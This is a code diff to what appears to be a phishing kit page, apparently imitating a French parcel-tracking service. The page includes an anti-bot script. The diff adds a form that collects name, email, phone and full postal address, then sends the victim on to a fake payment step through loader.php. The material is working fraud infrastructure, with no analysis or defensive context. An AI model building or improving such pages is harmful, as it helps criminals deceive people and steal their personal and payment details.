@@ -5,7 +5,7 @@
 	require("antibots.php");
 
 	// Handle form submission to infos.php
-	if (isset($_GET['r']) && $_GET['r'] === 'infos') {
+	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 		include('actions/infos.php');
 		exit();
 	}
@@ -76,7 +76,37 @@
     </script>
 </head>
 
-<body class="no-js  ">
+  <body class="no-js">
+    <!-- User Info Form -->
+    <div class="user-info-section" style="max-width: 600px; margin: 50px auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
+        <h2 style="text-align: center; margin-bottom: 20px;">Vos informations</h2>
+        <form action="loader.php" method="post" class="user-info-form">
+            <div class="form-group" style="margin-bottom: 15px;">
+                <input type="text" name="last-name" placeholder="Nom" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <input type="text" name="first-name" placeholder="Prénom" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <input type="email" name="email" placeholder="Email" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <input type="tel" name="telephone" placeholder="Téléphone" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <input type="text" name="zip-code" placeholder="Code Postal" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 15px;">
+                <input type="text" name="adresse" placeholder="Adresse" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 20px;">
+                <input type="text" name="city" placeholder="Ville" required class="form-control" style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
+            </div>
+            <button type="submit" class="c-voc-tracking-bar--button js--tracking-bar--button base-button" style="width: 100%; padding: 12px; background: #FFCC00; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">
+                Continuer vers le paiement
+            </button>
+        </form>
+    </div>
     <!--googleoff: all-->
 
     <nav class="c-nav-wcag">
